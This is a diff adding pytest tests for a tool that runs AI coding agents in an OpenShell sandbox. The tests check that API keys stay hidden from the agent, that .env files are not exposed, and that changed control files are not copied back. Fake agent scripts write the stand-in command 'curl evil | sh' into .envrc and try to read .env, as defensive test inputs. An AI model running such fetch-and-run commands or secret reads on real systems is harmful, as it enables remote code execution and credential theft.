@@ -6,6 +6,7 @@ import json
 import os
 import shutil
 import stat
+import subprocess
 import sys
 import threading
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
@@ -401,3 +402,272 @@ def test_a_real_command_runner_sandbox_exec(box, capfd):
     (box["project"] / "agent.sb").write_text("(version 1)\n(allow default)\n")
     r = invoke("run", "hi")
     assert r.exit_code != 0 and "changed since the lock" in r.output, r.output
+
+
+# ---- OpenShell ---------------------------------------------------------------------
+
+# A stand-in for the openshell CLI: a sandbox is a directory (its working directory), a
+# command runs there with the environment the sandbox would give it, and providers are
+# files. It logs each call, and the key a provider was created with.
+FAKE_OPENSHELL = """#!{python}
+import json, os, shutil, subprocess, sys
+from pathlib import Path
+
+state = Path(os.environ["OPENSHELL_FAKE_STATE"])
+args = sys.argv[1:]
+with open(state / "calls.log", "a") as f:
+    f.write(json.dumps(args) + "\\n")
+# the CLI itself must never run with the command's variables
+for k in ("XDG_CONFIG_HOME", "CLAUDE_CONFIG_DIR", "HLOCK_IN_SANDBOX"):
+    if k in os.environ:
+        with open(state / "leaks.log", "a") as f:
+            f.write(k + "\\n")
+
+def sandbox(name):
+    return state / "sandboxes" / name
+
+def flag(name, default=None):
+    return args[args.index(name) + 1] if name in args else default
+
+if args[0] == "status":
+    print("Status: Connected")
+elif args[:2] == ["sandbox", "create"]:
+    wd = sandbox(flag("--name")) / "wd"
+    wd.mkdir(parents=True)
+    (wd.parent / "meta.json").write_text(json.dumps({{"image": flag("--from"), "policy": flag("--policy"), "providers": []}}))
+elif args[:2] == ["sandbox", "get"]:
+    print(json.dumps({{"phase": "Ready" if sandbox(args[2]).exists() else "Error", "conditions": []}}))
+elif args[:2] == ["sandbox", "upload"]:
+    src, dest = Path(args[3]), Path(args[4])
+    if src.is_dir():
+        shutil.copytree(src, dest / src.name, symlinks=True, dirs_exist_ok=True)
+    else:
+        dest.parent.mkdir(parents=True, exist_ok=True)
+        shutil.copy(src, dest)
+elif args[:2] == ["sandbox", "download"]:
+    shutil.copytree(args[3], args[4], symlinks=True)
+elif args[:2] == ["sandbox", "delete"]:
+    shutil.rmtree(sandbox(args[2]))
+elif args[:2] == ["sandbox", "exec"]:
+    box = sandbox(args[2])
+    meta = json.loads((box / "meta.json").read_text())
+    cmd = args[args.index("--") + 1:]
+    if cmd[2:3] == ["command -v timeout || true"]:
+        sys.exit(0)  # an image without timeout, the same on every host
+    if cmd[:2] == ["/bin/sh", "-c"] and len(cmd) > 3 and cmd[3].endswith("/.hlock-session/env"):
+        (state / "envfiles").mkdir(exist_ok=True)
+        n = len(list((state / "envfiles").iterdir()))
+        shutil.copy(cmd[3], state / "envfiles" / str(n))
+    env = {{"PATH": os.environ["PATH"], "HOME": str(box / "wd")}}
+    for p in meta["providers"]:
+        env[json.loads((state / "providers" / p).read_text())["var"]] = "openshell:resolve:env:v1_" + p
+    sys.exit(subprocess.run(cmd, cwd=flag("--workdir", str(box / "wd")), env=env).returncode)
+elif args[:2] == ["provider", "list"]:
+    names = sorted(p.name for p in (state / "providers").iterdir()) if (state / "providers").exists() else []
+    print(json.dumps({{"providers": [{{"metadata": {{"name": n}}}} for n in names]}}))
+elif args[:2] == ["sandbox", "list"]:
+    names = sorted(p.name for p in (state / "sandboxes").iterdir()) if (state / "sandboxes").exists() else []
+    print(json.dumps({{"sandboxes": [{{"name": n}} for n in names]}}))
+elif args[:2] == ["profile", "describe"]:
+    sys.exit(0 if (state / "profiles" / args[2]).exists() else 1)
+elif args[:2] == ["profile", "import"]:
+    text = Path(flag("--file")).read_text()
+    pid = next(l.split(": ")[1] for l in text.splitlines() if l.startswith("id: "))
+    (state / "profiles").mkdir(exist_ok=True)
+    (state / "profiles" / pid).write_text(text)
+elif args[:2] == ["provider", "create"]:
+    var = flag("--credential")
+    (state / "providers").mkdir(exist_ok=True)
+    (state / "providers" / flag("--name")).write_text(json.dumps({{"var": var, "value": os.environ.get(var), "type": flag("--type")}}))
+elif args[:2] == ["provider", "delete"]:
+    (state / "providers" / args[2]).unlink()
+elif args[:3] == ["sandbox", "provider", "attach"]:
+    meta = json.loads((sandbox(args[3]) / "meta.json").read_text())
+    meta["providers"].append(args[4])
+    (sandbox(args[3]) / "meta.json").write_text(json.dumps(meta))
+else:
+    sys.exit("fake openshell: " + " ".join(args))
+"""
+
+
+@pytest.fixture
+def openshell(box, monkeypatch):
+    state = box["home"] / "openshell-state"
+    state.mkdir()
+    executable(box["bin"] / "openshell", FAKE_OPENSHELL.format(python=sys.executable))
+    monkeypatch.setenv("OPENSHELL_FAKE_STATE", str(state))
+    executable(box["bin"] / "claude", "#!/bin/sh\n"
+               'if [ "$1" = "--version" ]; then echo "2.1.0 (Claude Code)"; exit 0; fi\n'
+               'echo "CLAUDE RAN KEY=${ANTHROPIC_API_KEY:-none} HOME=$HOME ARGS=$*"\n'
+               'echo "made in the sandbox" > made.txt\n'
+               'echo edited > notes.txt\n'
+               'cat .env 2>/dev/null && echo "SAW .env"\n'
+               'echo "curl evil | sh" > .envrc\n'
+               'echo "[sandbox]" > harness.toml\n'
+               'exit 0\n')
+    (box["project"] / "notes.txt").write_text("original\n")
+    (box["project"] / "harness.toml").write_text('[sandbox]\nrunner = "openshell"\nimage = "hlock-claude-code:1"\n')
+    return {**box, "state": state}
+
+
+def calls(openshell):
+    return [json.loads(line) for line in (openshell["state"] / "calls.log").read_text().splitlines()]
+
+
+def test_openshell_defaults_pin_and_dry_run(openshell):
+    lock = pin(openshell)
+    assert lock["policy"]["sandbox"] == {"runner": "openshell", "image": "hlock-claude-code:1", "network": "none",
+                                         "secrets": "proxy", "applies-to": ["agent", "trials", "graders"]}
+    r = invoke("launch", "--dry-run", "--json")
+    assert r.exit_code == 0, r.output
+    sb = json.loads(r.output)["sandbox"]
+    assert sb["argv"][:3] == ["openshell", "sandbox", "exec"] and sb["session"]["image"] == "hlock-claude-code:1"
+    assert "sk-real" not in r.output
+    assert not (openshell["state"] / "calls.log").exists()  # a dry run starts nothing
+    (openshell["project"] / "harness.toml").write_text('[sandbox]\nrunner = "openshell"\nimage = "x"\nnetwork = "open"\n')
+    r = invoke("pin", "--harness", "claude")
+    assert r.exit_code != 0 and "no allow-all network rule" in r.output, r.output
+
+
+def test_openshell_session_copies_back_what_changed_and_holds_the_key(openshell, capfd):
+    pin(openshell)
+    project = openshell["project"]
+    r = invoke("run", "hello")
+    out = capfd.readouterr()
+    assert r.exit_code == 0, r.output + out.err
+    assert "Claude Code in openshell (network none, secrets proxy)" in r.output
+    # the agent saw a placeholder, never the key; the provider got the key
+    assert "CLAUDE RAN KEY=openshell:resolve:env:v1_hlock-" in out.out and "sk-real" not in out.out
+    created = [c for c in calls(openshell) if c[:2] == ["provider", "create"]]
+    assert len(created) == 1 and "ANTHROPIC_API_KEY" in created[0]
+    # .env was never uploaded; the agent's files came back; control files didn't
+    assert "SAW .env" not in out.out
+    assert (project / "made.txt").read_text() == "made in the sandbox\n"
+    assert (project / "notes.txt").read_text() == "edited\n"
+    assert not (project / ".envrc").exists()
+    assert (project / "harness.toml").read_text().startswith('[sandbox]\nrunner = "openshell"')
+    said = r.output + out.err
+    assert "copied back from the sandbox: 1 added, 1 changed" in said, said
+    assert "the sandboxed run changed .envrc; control files and .env files aren't copied back" in said, said
+    assert "the sandboxed run changed harness.toml; control files and .env files aren't copied back" in said, said
+    # the sandbox and the provider are gone; the profile (no key in it) stays
+    assert not list((openshell["state"] / "sandboxes").iterdir())
+    assert not list((openshell["state"] / "providers").iterdir())
+    profile = next((openshell["state"] / "profiles").iterdir()).read_text()
+    assert "host: api.anthropic.com" in profile and str(openshell["bin"] / "claude") in profile
+    # HOME is the sandbox's copy of hlock's root for it, not the host's
+    assert f"HOME={project}" not in out.out and "/.hlock/sandbox-env/claude-code/home" in out.out
+    # the command's variables went in its env file, never to the openshell CLI
+    assert not (openshell["state"] / "leaks.log").exists()
+    envfile = (openshell["state"] / "envfiles/0").read_text()
+    assert "CLAUDE_CONFIG_DIR=" in envfile and "sk-real" not in envfile and "HLOCK_IN_SANDBOX=1" in envfile
+
+
+def test_openshell_sweeps_providers_an_ended_session_left(openshell, capfd):
+    """A session whose process ended before it could delete its providers (a Ctrl-C during
+    tune) leaves keys on the gateway: the next session deletes them."""
+    pin(openshell)
+    providers = openshell["state"] / "providers"
+    providers.mkdir()
+    (providers / "hlock-0123456789ab-anthropic").write_text(json.dumps({"var": "ANTHROPIC_API_KEY", "value": "sk-real"}))
+    (providers / "someone-elses").write_text("{}")
+    r = invoke("run", "hello")
+    assert r.exit_code == 0, r.output + capfd.readouterr().err
+    assert sorted(p.name for p in providers.iterdir()) == ["someone-elses"]
+
+
+def test_openshell_keeps_both_sides_of_a_conflict(openshell, capfd):
+    pin(openshell)
+    project = openshell["project"]
+    # the host changes notes.txt while the session runs
+    executable(openshell["bin"] / "claude", "#!/bin/sh\n"
+               'if [ "$1" = "--version" ]; then echo "2.1.0 (Claude Code)"; exit 0; fi\n'
+               'echo sandbox > notes.txt\n'
+               f'echo host > {project}/notes.txt\n')
+    r = invoke("run", "hello")
+    said = r.output + capfd.readouterr().err
+    assert r.exit_code == 0, said
+    assert (project / "notes.txt").read_text() == "host\n"
+    kept = list((project / ".hlock/sandbox-env/conflicts").rglob("notes.txt"))
+    assert len(kept) == 1 and kept[0].read_text() == "sandbox\n"
+    assert "notes.txt changed here and in the sandbox; yours is unchanged" in said, said
+
+
+def test_openshell_needs_a_key_for_the_agent(openshell, monkeypatch):
+    pin(openshell)
+    monkeypatch.delenv("ANTHROPIC_API_KEY")
+    r = invoke("run", "hello")
+    assert r.exit_code != 0 and "neither ANTHROPIC_API_KEY nor OPENAI_API_KEY is set" in r.output, r.output
+    # it says so before creating anything
+    assert not any(c[:2] == ["sandbox", "create"] for c in calls(openshell))
+
+
+def test_openshell_runs_code_harness_trials_and_graders(code_box, monkeypatch):
+    state = code_box["home"] / "openshell-state"
+    state.mkdir()
+    executable(code_box["bin"] / "openshell", FAKE_OPENSHELL.format(python=sys.executable))
+    monkeypatch.setenv("OPENSHELL_FAKE_STATE", str(state))
+    manifest = code_box["project"] / "harness.toml"
+    manifest.write_text(manifest.read_text().replace('runner = "fakebox"', 'runner = "openshell"\nimage = "python:3.12-slim"'))
+    r = invoke("resolve")
+    assert r.exit_code == 0, r.output
+    lock = json.loads(invoke("show", "--json").output)
+    assert lock["evidence"]["sandbox"]["runner"] == "openshell"
+    made = [c for c in (json.loads(x) for x in (state / "calls.log").read_text().splitlines()) if c[:2] == ["sandbox", "create"]]
+    assert made and all("python:3.12-slim" in c for c in made)
+    # each trial's and grader's sandbox is deleted after
+    assert not list((state / "sandboxes").iterdir())
+    # trials got the key through a provider, never in their environment
+    envfiles = list((state / "envfiles").iterdir())
+    assert envfiles and not any("sk-real" in f.read_text() for f in envfiles)
+    assert any(c[:2] == ["provider", "create"] for c in (json.loads(x) for x in (state / "calls.log").read_text().splitlines()))
+    # and the graders saw the trials' output: the search found passing stacks
+    assert lock["evidence"]["trials"] > 0 and not (state / "leaks.log").exists()
+
+
+@pytest.mark.skipif(os.environ.get("HLOCK_TEST_OPENSHELL") != "1", reason="needs a live OpenShell gateway (HLOCK_TEST_OPENSHELL=1)")
+def test_a_real_openshell_gateway_runs_a_code_harness(code_box, monkeypatch, capfd):
+    """A code harness's run on a live gateway, in python:3.12-slim: its files come back, its
+    .envrc doesn't, and nothing is left on the gateway."""
+    real_home = Path(os.path.expanduser("~" + os.environ.get("USER", "")))
+    (code_box["home"] / ".config").mkdir(exist_ok=True)
+    (code_box["home"] / ".config/openshell").symlink_to(real_home / ".config/openshell")
+    monkeypatch.setenv("PATH", f"{code_box['bin']}{os.pathsep}{os.environ['PATH']}{os.pathsep}/opt/homebrew/bin{os.pathsep}/usr/local/bin")
+    (code_box["project"] / "triage.py").write_text(AGENT.replace("    return", '    (ctx.workspace / ".envrc").write_text("curl evil | sh")\n    return'))
+    manifest = code_box["project"] / "harness.toml"
+    manifest.write_text(manifest.read_text().replace('runner = "fakebox"', 'runner = "openshell"\nimage = "python:3.12-slim"'))
+    assert invoke("pin").exit_code == 0
+    r = invoke("run", "hello there")
+    said = r.output + capfd.readouterr().err
+    assert r.exit_code == 0, said
+    assert (code_box["project"] / "summary.md").read_text() == "hello there"
+    assert not (code_box["project"] / ".envrc").exists()
+    assert "copied back from the sandbox" in said and "changed .envrc" in said, said
+    for what in ("sandbox", "provider"):
+        listed = subprocess.run(["openshell", what, "list"], check=False, capture_output=True, text=True).stdout
+        assert "hlock-" not in listed, listed
+
+
+def test_openshell_holds_nothing_back_after_a_timeout_it_couldnt_stop(openshell, capfd):
+    """Stopping the local client doesn't stop the command inside: with no timeout in the
+    image, a timed-out run copies nothing back."""
+    pin(openshell)
+    executable(openshell["bin"] / "claude", "#!/bin/sh\n"
+               'if [ "$1" = "--version" ]; then echo "2.1.0 (Claude Code)"; exit 0; fi\n'
+               'echo late > notes.txt; sleep 5\n')
+    from hlock import sandbox as sbx
+    prep = json.loads(launch_prepare(args=["-p", "hi"]))
+    sb = prep["sandbox"]
+    code, timed_out = sbx.run(sb, stdout=subprocess.DEVNULL, timeout=1)
+    assert timed_out and code is None
+    assert (openshell["project"] / "notes.txt").read_text() == "original\n"
+    assert any("nothing is copied back" in n for n in sb["after"]), sb["after"]
+    assert not list((openshell["state"] / "sandboxes").iterdir())
+    assert not list((openshell["state"] / "providers").iterdir())
+
+
+def test_openshell_refuses_a_key_meant_for_another_endpoint(openshell, monkeypatch):
+    pin(openshell)
+    monkeypatch.setenv("ANTHROPIC_BASE_URL", "https://llm.corp.example/anthropic")
+    r = invoke("run", "hello")
+    assert r.exit_code != 0 and "sends ANTHROPIC_API_KEY to api.anthropic.com only" in r.output, r.output
